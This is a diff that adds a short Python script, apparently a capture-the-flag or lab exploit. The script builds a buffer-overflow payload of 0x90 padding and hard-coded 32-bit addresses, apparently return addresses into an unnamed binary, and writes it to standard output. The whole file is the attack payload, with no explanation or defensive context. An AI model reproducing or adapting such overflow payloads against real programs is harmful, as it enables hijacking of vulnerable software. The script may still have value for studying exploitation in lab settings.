@@ -1,0 +1,13 @@
+#!/usr/bin/env python3
+import sys
+
+payload  = b"\x90" * 4
+payload += b"\x11\x89\xb2\xb0"
+payload += b"\x90" * 12
+payload += b"\x96\x91\x04\x08"
+payload += b"\x70\x90\x04\x08"
+
+
+
+sys.stdout.buffer.write(payload)
+
